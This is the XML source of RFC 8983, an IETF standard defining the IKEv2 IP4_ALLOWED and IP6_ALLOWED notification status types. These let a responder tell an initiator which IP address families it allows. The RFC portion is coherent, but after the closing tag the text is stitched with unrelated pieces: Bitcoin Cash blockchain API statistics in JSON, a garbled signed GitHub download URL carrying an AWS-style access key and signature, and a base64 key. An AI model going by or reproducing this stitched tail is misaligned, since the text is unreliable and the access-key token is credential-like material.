        <keyword>IPv6 transition</keyword>
        <keyword>TS.24302</keyword>
        <keyword>PDP context</keyword>
        <keyword>PDP type</keyword>
        <abstract pn="section-abstract">
            <t indent="0" pn="section-abstract-1">This document specifies new Internet Key Exchange Protocol Version 2 (IKEv2) notification status types to better
                manage IPv4 and IPv6 coexistence by allowing the responder to signal to
                the initiator which address families are allowed.</t>
            <t indent="0" pn="section-abstract-2">This document updates RFC 7296.</t>
        </abstract>
        <boilerplate>
            <section anchor="status-of-memo" numbered="false" removeInRFC="false" toc="exclude" pn="section-boilerplate.1">
                <name slugifiedName="name-status-of-this-memo">Status of This Memo</name>
                <t indent="0" pn="section-boilerplate.1-1">
                    This is an Internet Standards Track document.
                </t>
                <t indent="0" pn="section-boilerplate.1-2">
                    This document is a product of the Internet Engineering Task Force
                    (IETF).  It represents the consensus of the IETF community.  It has
                    received public review and has been approved for publication by
                    the Internet Engineering Steering Group (IESG).  Further
                    information on Internet Standards is available in Section 2 of
                    RFC 7841.
                </t>
                <t indent="0" pn="section-boilerplate.1-3">
                    Information about the current status of this document, any
                    errata, and how to provide feedback on it may be obtained at
                    <eref target="https://www.rfc-editor.org/info/rfc8983" brackets="none" />.
                </t>
            </section>
            <section anchor="copyright" numbered="false" removeInRFC="false" toc="exclude" pn="section-boilerplate.2">
                <name slugifiedName="name-copyright-notice">Copyright Notice</name>
                <t indent="0" pn="section-boilerplate.2-1">
                    Copyright (c) 2021 IETF Trust and the persons identified as the
                    document authors. All rights reserved.
                </t>
                <t indent="0" pn="section-boilerplate.2-2">
                    This document is subject to BCP 78 and the IETF Trust's Legal
                    Provisions Relating to IETF Documents
                    (<eref target="https://trustee.ietf.org/license-info" brackets="none" />) in effect on the date of
                    publication of this document. Please review these documents
                    carefully, as they describe your rights and restrictions with
                    respect to this document. Code Components extracted from this
                    document must include Simplified BSD License text as described in
                    Section 4.e of the Trust Legal Provisions and are provided without
                    warranty as described in the Simplified BSD License.
                </t>
            </section>
        </boilerplate>
        <toc>
            <section anchor="toc" numbered="false" removeInRFC="false" toc="exclude" pn="section-toc.1">
                <name slugifiedName="name-table-of-contents">Table of Contents</name>
                <ul bare="true" empty="true" indent="2" spacing="compact" pn="section-toc.1-1">
                    <li pn="section-toc.1-1.1">
                        <t indent="0" keepWithNext="true" pn="section-toc.1-1.1.1"><xref derivedContent="1" format="counter" sectionFormat="of" target="section-1" />.  <xref derivedContent="" format="title" sectionFormat="of" target="name-introduction">Introduction</xref></t>
                    </li>
                    <li pn="section-toc.1-1.2">
                        <t indent="0" keepWithNext="true" pn="section-toc.1-1.2.1"><xref derivedContent="2" format="counter" sectionFormat="of" target="section-2" />.  <xref derivedContent="" format="title" sectionFormat="of" target="name-terminology">Terminology</xref></t>
                    </li>
                    <li pn="section-toc.1-1.3">
                        <t indent="0" keepWithNext="true" pn="section-toc.1-1.3.1"><xref derivedContent="3" format="counter" sectionFormat="of" target="section-3" />.  <xref derivedContent="" format="title" sectionFormat="of" target="name-why-not-internal_address_fa">Why Not INTERNAL_ADDRESS_FAILURE?</xref></t>
                    </li>
                    <li pn="section-toc.1-1.4">
                        <t indent="0" pn="section-toc.1-1.4.1"><xref derivedContent="4" format="counter" sectionFormat="of" target="section-4" />.  <xref derivedContent="" format="title" sectionFormat="of" target="name-ip6_allowed-and-ip4_allowed">IP6_ALLOWED and IP4_ALLOWED Status Types</xref></t>
                    </li>
                    <li pn="section-toc.1-1.5">
                        <t indent="0" pn="section-toc.1-1.5.1"><xref derivedContent="5" format="counter" sectionFormat="of" target="section-5" />.  <xref derivedContent="" format="title" sectionFormat="of" target="name-update-to-rfc-7296">Update to RFC 7296</xref></t>
                    </li>
                    <li pn="section-toc.1-1.6">
                        <t indent="0" pn="section-toc.1-1.6.1"><xref derivedContent="6" format="counter" sectionFormat="of" target="section-6" />.  <xref derivedContent="" format="title" sectionFormat="of" target="name-security-considerations">Security Considerations</xref></t>
                    </li>
                    <li pn="section-toc.1-1.7">
                        <t indent="0" pn="section-toc.1-1.7.1"><xref derivedContent="7" format="counter" sectionFormat="of" target="section-7" />.  <xref derivedContent="" format="title" sectionFormat="of" target="name-iana-considerations">IANA Considerations</xref></t>
                    </li>
                    <li pn="section-toc.1-1.8">
                        <t indent="0" pn="section-toc.1-1.8.1"><xref derivedContent="8" format="counter" sectionFormat="of" target="section-8" />.  <xref derivedContent="" format="title" sectionFormat="of" target="name-references">References</xref></t>
                        <ul bare="true" empty="true" indent="2" spacing="compact" pn="section-toc.1-1.8.2">
                            <li pn="section-toc.1-1.8.2.1">
                                <t indent="0" pn="section-toc.1-1.8.2.1.1"><xref derivedContent="8.1" format="counter" sectionFormat="of" target="section-8.1" />.  <xref derivedContent="" format="title" sectionFormat="of" target="name-normative-references">Normative References</xref></t>
                            </li>
                            <li pn="section-toc.1-1.8.2.2">
                                <t indent="0" pn="section-toc.1-1.8.2.2.1"><xref derivedContent="8.2" format="counter" sectionFormat="of" target="section-8.2" />.  <xref derivedContent="" format="title" sectionFormat="of" target="name-informative-references">Informative References</xref></t>
                            </li>
                        </ul>
                    </li>
                    <li pn="section-toc.1-1.9">
                        <t indent="0" pn="section-toc.1-1.9.1"><xref derivedContent="" format="none" sectionFormat="of" target="section-appendix.a" /><xref derivedContent="" format="title" sectionFormat="of" target="name-acknowledgements">Acknowledgements</xref></t>
                    </li>
                    <li pn="section-toc.1-1.10">
                        <t indent="0" pn="section-toc.1-1.10.1"><xref derivedContent="" format="none" sectionFormat="of" target="section-appendix.b" /><xref derivedContent="" format="title" sectionFormat="of" target="name-authors-address">Author's Address</xref></t>
                    </li>
                </ul>
            </section>
        </toc>
    </front>
    <middle>
        <section numbered="true" toc="include" removeInRFC="false" pn="section-1">
            <name slugifiedName="name-introduction">Introduction</name>
            <t indent="0" pn="section-1-1">As described in <xref target="RFC7849" format="default" sectionFormat="of" derivedContent="RFC7849" />, if the subscription
                data or network configuration allows only one IP address family (IPv4 or
                IPv6), the cellular host must not request a second PDP-Context (<xref target="RFC6459" sectionFormat="of" section="3.2" format="default" derivedLink="https://rfc-editor.org/rfc/rfc6459#section-3.2" derivedContent="RFC6459" />) to the same Access Point Name
                (APN) for the other IP address family (AF). The Third Generation
                Partnership Project (3GPP) network informs the cellular host about
                allowed Packet Data Protocol (PDP) types by means of Session Management
                (SM) cause codes. In particular, the following cause codes can be
                returned: </t>
            <dl indent="3" newline="false" spacing="normal" pn="section-1-2">
                <dt pn="section-1-2.1">cause #50 "PDP type IPv4 only allowed":
                </dt>
                <dd pn="section-1-2.2">This cause code is used by the network to indicate that only PDP type IPv4
                    is allowed for the requested Public Data Network (PDN) connectivity.
                </dd>
                <dt pn="section-1-2.3">cause #51 "PDP type IPv6 only allowed":
                </dt>
                <dd pn="section-1-2.4">This cause code is used by the network to indicate that only PDP type IPv6
                    is allowed for the requested PDN connectivity.
                </dd>
                <dt pn="section-1-2.5">cause #52 "single address bearers only allowed":
                </dt>
                <dd pn="section-1-2.6">This cause code is used by the network to indicate that the requested PDN connectivity is accepted with the restriction that only single IP version bearers are allowed.
                </dd>
            </dl>
            <t indent="0" pn="section-1-3">If the requested IPv4v6 PDP-Context is not supported by the network
                but IPv4 and IPv6 PDP types are allowed, then the cellular host will be
                configured with an IPv4 address or an IPv6 prefix by the network. It
                must initiate another PDP-Context activation of the other address family
                in addition to the one already activated for a given APN. The purpose of
                initiating a second PDP-Context is to achieve dual-stack connectivity
                (that is, IPv4 and IPv6 connectivity) by means of two PDP-Contexts.</t>
            <t indent="0" pn="section-1-4">When the User Equipment (UE) attaches to the 3GPP network using a
                non-3GPP access network (e.g., Wireless Local Area Network (WLAN)),
                there are no equivalent IKEv2
                capabilities <xref target="RFC7296" format="default" sectionFormat="of" derivedContent="RFC7296" /> notification codes for the
                3GPP network to inform the UE why an IP address family is not assigned
                or whether that UE should retry with another address family.</t>
            <t indent="0" pn="section-1-5">This document fills that void by introducing new IKEv2 notification
                status types for the sake of deterministic UE behaviors (<xref target="new" format="default" sectionFormat="of" derivedContent="Section 4" />).</t>
            <t indent="0" pn="section-1-6">These notification status types are not specific to 3GPP
                architectures but can be used in other deployment contexts. Cellular
                networks are provided as an illustration example.</t>
        </section>
        <section anchor="notation" numbered="true" toc="include" removeInRFC="false" pn="section-2">
            <name slugifiedName="name-terminology">Terminology</name>
            <t indent="0" pn="section-2-1">
                The key words "<bcp14>MUST</bcp14>", "<bcp14>MUST NOT</bcp14>",
                "<bcp14>REQUIRED</bcp14>", "<bcp14>SHALL</bcp14>", "<bcp14>SHALL NOT</bcp14>", "<bcp14>SHOULD</bcp14>", "<bcp14>SHOULD NOT</bcp14>",
                "<bcp14>RECOMMENDED</bcp14>", "<bcp14>NOT RECOMMENDED</bcp14>",
                "<bcp14>MAY</bcp14>", and "<bcp14>OPTIONAL</bcp14>" in this document are
                to be interpreted as described in BCP 14 <xref target="RFC2119" format="default" sectionFormat="of" derivedContent="RFC2119" />
                <xref target="RFC8174" format="default" sectionFormat="of" derivedContent="RFC8174" /> when, and only when, they appear in all capitals,
                as shown here.
            </t>
            <t indent="0" pn="section-2-2">This document makes use of the terms defined in <xref target="RFC7296" format="default" sectionFormat="of" derivedContent="RFC7296" />. In particular, readers should be familiar with
                "initiator" and "responder" terms used in that document.</t>
        </section>
        <section numbered="true" toc="include" removeInRFC="false" pn="section-3">
            <name slugifiedName="name-why-not-internal_address_fa">Why Not INTERNAL_ADDRESS_FAILURE?</name>
            <t indent="0" pn="section-3-1">The following address assignment failures may be encountered when an
                initiator requests assignment of IP addresses/prefixes:</t>
            <ul spacing="normal" bare="false" empty="false" indent="3" pn="section-3-2">
                <li pn="section-3-2.1">An initiator asks for IPvx, but IPvx address assignment is not
                    supported by the responder.</li>
                <li pn="section-3-2.2">An initiator requests both IPv4 and IPv6 addresses, but only IPv4
                    address assignment is supported by the responder.</li>
                <li pn="section-3-2.3">An initiator requests both IPv4 and IPv6 addresses, but only IPv6
                    prefix assignment is supported by the responder.</li>
                <li pn="section-3-2.4">An initiator asks for both IPv4 and IPv6 addresses, but only one
                    address family can be assigned by the responder for policy
                    reasons.</li>
            </ul>
            <t indent="0" pn="section-3-3">
                <xref target="RFC7296" sectionFormat="of" section="3.15.4" format="default" derivedLink="https://rfc-editor.org/rfc/rfc7296#section-3.15.4" derivedContent="RFC7296" /> defines a
                generic notification error type (INTERNAL_ADDRESS_FAILURE) that is
                related to a failure to handle an address assignment request. The
                responder sends INTERNAL_ADDRESS_FAILURE only if no addresses can be
                assigned. This behavior does not explicitly allow an initiator to
                determine why a given address family is not assigned, nor whether it
                should try using another address family. INTERNAL_ADDRESS_FAILURE is a
                catch-all error type when an address-related issue is encountered by an
                IKEv2 responder.</t>
            <t indent="0" pn="section-3-4">INTERNAL_ADDRESS_FAILURE does not provide sufficient hints to the
                IKEv2 initiator to adjust its behavior.</t>
        </section>
        <section anchor="new" numbered="true" toc="include" removeInRFC="false" pn="section-4">
            <name slugifiedName="name-ip6_allowed-and-ip4_allowed">IP6_ALLOWED and IP4_ALLOWED Status Types</name>
            <t indent="0" pn="section-4-1">IP6_ALLOWED and IP4_ALLOWED notification status types (see <xref target="sec-IANA" format="default" sectionFormat="of" derivedContent="Section 7" />) are defined to inform the initiator about the
                responder's address family assignment support capabilities and to
                report to the initiator the reason why an address assignment failed.
                These notification status types are used by the initiator to adjust its
                behavior accordingly (<xref target="update" format="default" sectionFormat="of" derivedContent="Section 5" />).</t>
            <t indent="0" pn="section-4-2">No data is associated with these notifications.</t>
        </section>
        <section anchor="update" numbered="true" toc="include" removeInRFC="false" pn="section-5">
            <name slugifiedName="name-update-to-rfc-7296">Update to RFC 7296</name>
            <t indent="0" pn="section-5-1">If the initiator is dual stack (i.e., supports both IPv4 and IPv6),
                it <bcp14>MUST</bcp14> include configuration attributes for both address
                families in its configuration request (absent explicit
                policy/configuration otherwise).  More details about IPv4 and IPv6
                configuration attributes are provided in <xref target="RFC7296" sectionFormat="of" section="3.15" format="default" derivedLink="https://rfc-editor.org/rfc/rfc7296#section-3.15" derivedContent="RFC7296" />. These attributes are used to infer
                the requested/assigned AFs listed in <xref target="notification_status" format="default" sectionFormat="of" derivedContent="Table 1" />.</t>
            <t indent="0" pn="section-5-2">The responder <bcp14>MUST</bcp14> include the IP6_ALLOWED and/or IP4_ALLOWED
                notification status type in a response to an address assignment request
                as indicated in <xref target="notification_status" format="default" sectionFormat="of" derivedContent="Table 1" />.</t>
            <table anchor="notification_status" align="center" pn="table-1">
                <name slugifiedName="name-returned-notification-statu">Returned Notification Status Types</name>
                <thead>
                    <tr>
                        <th align="left" colspan="1" rowspan="1">Requested AF(s) (Initiator)</th>
                        <th align="left" colspan="1" rowspan="1">Supported AF(s) (Responder)</th>
                        <th align="left" colspan="1" rowspan="1">Assigned AF(s) (Responder)</th>
                        <th align="left" colspan="1" rowspan="1">Returned Notification Status Type(s) (Responder)</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td align="left" colspan="1" rowspan="1">IPv4</td>
                        <td align="left" colspan="1" rowspan="1">IPv6</td>
                        <td align="left" colspan="1" rowspan="1">None</td>
                        <td align="left" colspan="1" rowspan="1">IP6_ALLOWED</td>
                    </tr>
                    <tr>
                        <td align="left" colspan="1" rowspan="1">IPv4</td>
                        <td align="left" colspan="1" rowspan="1">IPv4</td>
                        <td align="left" colspan="1" rowspan="1">IPv4</td>
                        <td align="left" colspan="1" rowspan="1">IP4_ALLOWED</td>
                    </tr>
                    <tr>
                        <td align="left" colspan="1" rowspan="1">IPv4</td>
                        <td align="left" colspan="1" rowspan="1">IPv4 and IPv6</td>
                        <td align="left" colspan="1" rowspan="1">IPv4</td>
                        <td align="left" colspan="1" rowspan="1">IP4_ALLOWED, IP6_ALLOWED</td>
                    </tr>
                    <tr>
                        <td align="left" colspan="1" rowspan="1">IPv6</td>
                        <td align="left" colspan="1" rowspan="1">IPv6</td>
                        <td align="left" colspan="1" rowspan="1">IPv6</td>
                        <td align="left" colspan="1" rowspan="1">IP6_ALLOWED</td>
                    </tr>
                    <tr>
                        <td align="left" colspan="1" rowspan="1">IPv6</td>
                        <td align="left" colspan="1" rowspan="1">IPv4</td>
                        <td align="left" colspan="1" rowspan="1">None</td>
                        <td align="left" colspan="1" rowspan="1">IP4_ALLOWED</td>
                    </tr>
                    <tr>
                        <td align="left" colspan="1" rowspan="1">IPv6</td>
                        <td align="left" colspan="1" rowspan="1">IPv4 and IPv6</td>
                        <td align="left" colspan="1" rowspan="1">IPv6</td>
                        <td align="left" colspan="1" rowspan="1">IP4_ALLOWED, IP6_ALLOWED</td>
                    </tr>
                    <tr>
                        <td align="left" colspan="1" rowspan="1">IPv4 and IPv6</td>
                        <td align="left" colspan="1" rowspan="1">IPv4</td>
                        <td align="left" colspan="1" rowspan="1">IPv4</td>
                        <td align="left" colspan="1" rowspan="1">IP4_ALLOWED</td>
                    </tr>
                    <tr>
                        <td align="left" colspan="1" rowspan="1">IPv4 and IPv6</td>
                        <td align="left" colspan="1" rowspan="1">IPv6</td>
                        <td align="left" colspan="1" rowspan="1">IPv6</td>
                        <td align="left" colspan="1" rowspan="1">IP6_ALLOWED</td>
                    </tr>
                    <tr>
                        <td align="left" colspan="1" rowspan="1">IPv4 and IPv6</td>
                        <td align="left" colspan="1" rowspan="1">IPv4 and IPv6</td>
                        <td align="left" colspan="1" rowspan="1">IPv4 and IPv6</td>
                        <td align="left" colspan="1" rowspan="1">IP4_ALLOWED, IP6_ALLOWED</td>
                    </tr>
                    <tr>
                        <td align="left" colspan="1" rowspan="1">IPv4 and IPv6</td>
                        <td align="left" colspan="1" rowspan="1">IPv4 or IPv6 (policy based)</td>
                        <td align="left" colspan="1" rowspan="1">IPv4 or IPv6</td>
                        <td align="left" colspan="1" rowspan="1">IP4_ALLOWED, IP6_ALLOWED</td>
                    </tr>
                </tbody>
            </table>
            <t indent="0" pn="section-5-4">If the initiator only receives one single IP4_ALLOWED
                or IP6_ALLOWED notification from the responder, the initiator <bcp14>MUST NOT</bcp14> send a subsequent request for an alternate address family
                not supported by the responder.</t>
            <t indent="0" pn="section-5-5">If a dual-stack initiator requests only an IPv6 prefix (or an IPv4
                address) but only receives an IP4_ALLOWED (or IP6_ALLOWED)
                notification status type from the responder, the initiator
                <bcp14>MUST</bcp14> send a request for IPv4 address(es) (or IPv6
                prefix(es)).</t>
            <t indent="0" pn="section-5-6">If a dual-stack initiator requests both an IPv6 prefix and an IPv4
                address but receives an IPv6 prefix (or an IPv4 address) only with
                both IP4_ALLOWED and IP6_ALLOWED notification status types from the
                responder, the initiator <bcp14>MAY</bcp14> send a request for the
                other AF (i.e., IPv4 address (or IPv6 prefix)).

                In such case, the initiator <bcp14>MUST</bcp14> create a new IKE Security
                Association (SA) and request another address family using the new IKE
                SA.</t>
            <t indent="0" pn="section-5-7">For other address-related error cases that have not been covered by
                the aforementioned notification status types, the responder/initiator
                <bcp14>MUST</bcp14> follow the procedure defined in <xref target="RFC7296" sectionFormat="of" section="3.15.4" format="default" derivedLink="https://rfc-editor.org/rfc/rfc7296#section-3.15.4" derivedContent="RFC7296" />.</t>
        </section>
        <section anchor="Security" numbered="true" toc="include" removeInRFC="false" pn="section-6">
            <name slugifiedName="name-security-considerations">Security Considerations</name>
            <t indent="0" pn="section-6-1">Since the IPv4/IPv6 capabilities of a node are readily determined
                from the traffic it generates, this document does not introduce any
                new security considerations compared to the ones described in <xref target="RFC7296" format="default" sectionFormat="of" derivedContent="RFC7296" />, which continue to apply.</t>
        </section>
        <section anchor="sec-IANA" numbered="true" toc="include" removeInRFC="false" pn="section-7">
            <name slugifiedName="name-iana-considerations">IANA Considerations</name>
            <t indent="0" pn="section-7-1">IANA has updated the "IKEv2 Notify Message Types
                - Status Types" registry (available at
                <eref brackets="angle" target="https://www.iana.org/assignments/ikev2-parameters/" />)
                with the following status types:</t>
            <table anchor="iana" align="center" pn="table-2">
                <name slugifiedName="name-updates-to-ikev2-notify-mes">Updates to "IKEv2 Notify Message Types - Status Types" Registry</name>
                <thead>
                    <tr>
                        <th align="left" colspan="1" rowspan="1">Value</th>
                        <th align="left" colspan="1" rowspan="1">NOTIFY MESSAGES - STATUS TYPES</th>
                        <th align="left" colspan="1" rowspan="1">Reference</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td align="left" colspan="1" rowspan="1">16439</td>
                        <td align="left" colspan="1" rowspan="1">IP4_ALLOWED</td>
                        <td align="left" colspan="1" rowspan="1">RFC 8983</td>
                    </tr>
                    <tr>
                        <td align="left" colspan="1" rowspan="1">16440</td>
                        <td align="left" colspan="1" rowspan="1">IP6_ALLOWED</td>
                        <td align="left" colspan="1" rowspan="1">RFC 8983</td>
                    </tr>
                </tbody>
            </table>
        </section>
    </middle>
    <back>
        <references pn="section-8">
            <name slugifiedName="name-references">References</name>
            <references pn="section-8.1">
                <name slugifiedName="name-normative-references">Normative References</name>
                <reference anchor="RFC2119" target="https://www.rfc-editor.org/info/rfc2119" quoteTitle="true" derivedAnchor="RFC2119">
                    <front>
                        <title>Key words for use in RFCs to Indicate Requirement Levels</title>
                        <author initials="S." surname="Bradner" fullname="S. Bradner">
                            <organization showOnFrontPage="true" />
                        </author>
                        <date year="1997" month="March" />
                        <abstract>
                            <t indent="0">In many standards track documents several words are used to signify the requirements in the specification.  These words are often capitalized. This document defines these words as they should be interpreted in IETF documents.  This document specifies an Internet Best Current Practices for the Internet Community, and requests discussion and suggestions for improvements.</t>
                        </abstract>
                    </front>
                    <seriesInfo name="BCP" value="14" />
                    <seriesInfo name="RFC" value="2119" />
                    <seriesInfo name="DOI" value="10.17487/RFC2119" />
                </reference>
                <reference anchor="RFC7296" target="https://www.rfc-editor.org/info/rfc7296" quoteTitle="true" derivedAnchor="RFC7296">
                    <front>
                        <title>Internet Key Exchange Protocol Version 2 (IKEv2)</title>
                        <author initials="C." surname="Kaufman" fullname="C. Kaufman">
                            <organization showOnFrontPage="true" />
                        </author>
                        <author initials="P." surname="Hoffman" fullname="P. Hoffman">
                            <organization showOnFrontPage="true" />
                        </author>
                        <author initials="Y." surname="Nir" fullname="Y. Nir">
                            <organization showOnFrontPage="true" />
                        </author>
                        <author initials="P." surname="Eronen" fullname="P. Eronen">
                            <organization showOnFrontPage="true" />
                        </author>
                        <author initials="T." surname="Kivinen" fullname="T. Kivinen">
                            <organization showOnFrontPage="true" />
                        </author>
                        <date year="2014" month="October" />
                        <abstract>
                            <t indent="0">This document describes version 2 of the Internet Key Exchange (IKE) protocol.  IKE is a component of IPsec used for performing mutual authentication and establishing and maintaining Security Associations (SAs).  This document obsoletes RFC 5996, and includes all of the errata for it.  It advances IKEv2 to be an Internet Standard.</t>
                        </abstract>
                    </front>
                    <seriesInfo name="STD" value="79" />
                    <seriesInfo name="RFC" value="7296" />
                    <seriesInfo name="DOI" value="10.17487/RFC7296" />
                </reference>
                <reference anchor="RFC8174" target="https://www.rfc-editor.org/info/rfc8174" quoteTitle="true" derivedAnchor="RFC8174">
                    <front>
                        <title>Ambiguity of Uppercase vs Lowercase in RFC 2119 Key Words</title>
                        <author initials="B." surname="Leiba" fullname="B. Leiba">
                            <organization showOnFrontPage="true" />
                        </author>
                        <date year="2017" month="May" />
                        <abstract>
                            <t indent="0">RFC 2119 specifies common key words that may be used in protocol  specifications.  This document aims to reduce the ambiguity by clarifying that only UPPERCASE usage of the key words have the  defined special meanings.</t>
                        </abstract>
                    </front>
                    <seriesInfo name="BCP" value="14" />
                    <seriesInfo name="RFC" value="8174" />
                    <seriesInfo name="DOI" value="10.17487/RFC8174" />
                </reference>
            </references>
            <references pn="section-8.2">
                <name slugifiedName="name-informative-references">Informative References</name>
                <reference anchor="RFC6459" target="https://www.rfc-editor.org/info/rfc6459" quoteTitle="true" derivedAnchor="RFC6459">
                    <front>
                        <title>IPv6 in 3rd Generation Partnership Project (3GPP) Evolved Packet System (EPS)</title>
                        <author initials="J." surname="Korhonen" fullname="J. Korhonen" role="editor">
                            <organization showOnFrontPage="true" />
                        </author>
                        <author initials="J." surname="Soininen" fullname="J. Soininen">
                            <organization showOnFrontPage="true" />
                        </author>
                        <author initials="B." surname="Patil" fullname="B. Patil">
                            <organization showOnFrontPage="true" />
                        </author>
                        <author initials="T." surname="Savolainen" fullname="T. Savolainen">
                            <organization showOnFrontPage="true" />
                        </author>
                        <author initials="G." surname="Bajko" fullname="G. Bajko">
                            <organization showOnFrontPage="true" />
                        </author>
                        <author initials="K." surname="Iisakkila" fullname="K. Iisakkila">
                            <organization showOnFrontPage="true" />
                        </author>
                        <date year="2012" month="January" />
                        <abstract>
                            <t indent="0">The use of cellular broadband for accessing the Internet and other data services via smartphones, tablets, and notebook/netbook computers has increased rapidly as a result of high-speed packet data networks such as HSPA, HSPA+, and now Long-Term Evolution (LTE) being deployed.  Operators that have deployed networks based on 3rd Generation Partnership Project (3GPP) network architectures are facing IPv4 address shortages at the Internet registries and are feeling pressure to migrate to IPv6.  This document describes the support for IPv6 in 3GPP network architectures.  This document is  not an Internet Standards Track specification; it is published for  informational purposes.</t>
                        </abstract>
                    </front>
                    <seriesInfo name="RFC" value="6459" />
                    <seriesInfo name="DOI" value="10.17487/RFC6459" />
                </reference>
                <reference anchor="RFC7849" target="https://www.rfc-editor.org/info/rfc7849" quoteTitle="true" derivedAnchor="RFC7849">
                    <front>
                        <title>An IPv6 Profile for 3GPP Mobile Devices</title>
                        <author initials="D." surname="Binet" fullname="D. Binet">
                            <organization showOnFrontPage="true" />
                        </author>
                        <author initials="M." surname="Boucadair" fullname="M. Boucadair">
                            <organization showOnFrontPage="true" />
                        </author>
                        <author initials="A." surname="Vizdal" fullname="A. Vizdal">
                            <organization showOnFrontPage="true" />
                        </author>
                        <author initials="G." surname="Chen" fullname="G. Chen">
                            <organization showOnFrontPage="true" />
                        </author>
                        <author initials="N." surname="Heatley" fullname="N. Heatley">
                            <organization showOnFrontPage="true" />
                        </author>
                        <author initials="R." surname="Chandler" fullname="R. Chandler">
                            <organization showOnFrontPage="true" />
                        </author>
                        <author initials="D." surname="Michaud" fullname="D. Michaud">
                            <organization showOnFrontPage="true" />
                        </author>
                        <author initials="D." surname="Lopez" fullname="D. Lopez">
                            <organization showOnFrontPage="true" />
                        </author>
                        <author initials="W." surname="Haeffner" fullname="W. Haeffner">
                            <organization showOnFrontPage="true" />
                        </author>
                        <date year="2016" month="May" />
                        <abstract>
                            <t indent="0">This document defines a profile that is a superset of the connection to IPv6 cellular networks defined in the IPv6 for Third Generation Partnership Project (3GPP) Cellular Hosts document.  This document defines a profile that is a superset of the connections to IPv6 cellular networks defined in "IPv6 for Third Generation Partnership Project (3GPP) Cellular Hosts" (RFC 7066).</t>
                            <t indent="0">Both mobile hosts and mobile devices with the capability to share their 3GPP mobile connectivity are in scope.</t>
                        </abstract>
                    </front>
                    <seriesInfo name="RFC" value="7849" />
                    <seriesInfo name="DOI" value="10.17487/RFC7849" />
                </reference>
            </references>
        </references>
        <section numbered="false" toc="include" removeInRFC="false" pn="section-appendix.a">
            <name slugifiedName="name-acknowledgements">Acknowledgements</name>
            <t indent="0" pn="section-appendix.a-1">Many thanks to <contact fullname="Christian Jacquenet" /> for the review.</t>
            <t indent="0" pn="section-appendix.a-2">Thanks to <contact fullname="Paul Wouters" />, <contact fullname="Yaov       Nir" />, <contact fullname="Valery Smyslov" />, <contact fullname="Daniel       Migault" />, <contact fullname="Tero Kivinen" />, and <contact fullname="Michael Richardson" /> for the comments and review.</t>
            <t indent="0" pn="section-appendix.a-3">Thanks to <contact fullname="Benjamin Kaduk" /> for the AD review.</t>
            <t indent="0" pn="section-appendix.a-4">Thanks to <contact fullname="Murray Kucherawy" />, <contact fullname="Éric Vyncke" />, and <contact fullname="Robert Wilton" /> for
                the IESG review.</t>
        </section>
        <section anchor="authors-addresses" numbered="false" removeInRFC="false" toc="include" pn="section-appendix.b">
            <name slugifiedName="name-authors-address">Author's Address</name>
            <author fullname="Mohamed Boucadair" initials="M." surname="Boucadair">
                <organization showOnFrontPage="true">Orange</organization>
                <address>
                    <postal>
                        <street />
                        <city>Rennes</city>
                        <code>35000</code>
                        <country>France</country>
                    </postal>
                    <email>mohamed.boucadair@orange.com</email>
                </address>
            </author>
        </section>
    </back>
</rfc>{"data":{"blocks":714809,"transactions":347695910,"outputs":918093550,"circulation":1890504364665292,"blocks_24h":174,"transactions_24h":80987,"difficulty":220350861527.24,"volume_24h":77261655236626,"mempool_transactions":239,"mempool_size":119646,"mempool_tps":1.1333333333333333,"mempool_total_fee_usd":2.1342,"best_block_height":714808,"best_block_hash":"00000000000000000193761d8e4e3754948c509dce00394db554cf62a8907f79","best_block_time":"2021-11-19 19:48:14","blockchain_size":174723013230,"average_transaction_fee_24h":1398,"inflation_24h":108750000000,"median_transaction_fee_24h":220,"cdd_24h":5594017.539628745,"mempool_outputs":1515,"largest_transaction_24h":{"hash":"3c7caaf92f5c7b0a5b1922652de1c18ee4831c9e281e20123d03a4c89f494fb5","value_usd":48311088},"nodes":1067,"hashrate_24h":"1908063999806229074","inflation_usd_24h":625192.875,"average_transaction_fee_usd_24h":0.008042608809942337,"median_transaction_fee_usd_24h":0.001264758,"market_price_usd":574.89,"market_price_btc":0.0098970509752612,"market_price_usd_change_24h_percentage":2.41075,"market_cap_usd":10868254346,"market_dominance_percentage":0.4,"countdowns":[],"suggested_transaction_fee_per_byte_sat":1,"hodling_addresses":20017389,"layer_2":{"slp":{"tokens":267029,"transactions":2259449,"tokens_24h":0,"transactions_24h":0}}},"context":{"code":200,"source":"A","state":714808,"market_price_usd":575.15,"cache":{"live":false,"duration":"Ignore","since":"2021-11-19 19:52:09","until":"2021-11-19 19:53:20","time":4.0531158447265625e-6},"api":{"version":"2.0.93","last_major_update":"2021-07-19 00:00:00","next_major_update":null,"documentation":"https:\/\/blockchair.com\/api\/docs","notice":":)"},"server":"BCH3","time":0.8398501873016357,"render_time":0.049240827560424805,"full_time":0.04924488067626953,"request_cost":1}}https://github-releases.githubuser content.com/39150490/1d196434-caac-4cda-aa52-db75f35fbfb6?X -Amz-Algorithm=AWS 4-HMAC-SHA256&X-Amz-Credential AKIAIWNIYA X4CSVEH53A/20211101/us-east-1/s3/aws4_request&X-Amz -Date=20211101T1514182&X-Amz-Expires=300&X-Amz-Signature=fa 058bdad310135af26eed386db6a990b274901a1fc31762c06d200946873 381&X-Amz-SignedHeaders-host&actor_id=0&key_id=0&repo_id=30 150490&response-content-disposition attachment; filenan e3Dgraph.snapshot-mainnet.lib&response-content-type-appli cation/octet-streamMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEGnJ7Yo1sX9b4kr4Aa5uq58JRQfzD8bIJXw7WXaap\/hVE+PnFxvjx4nVxt79SdRuUVeu++HZD0cGAv4IOznc96w
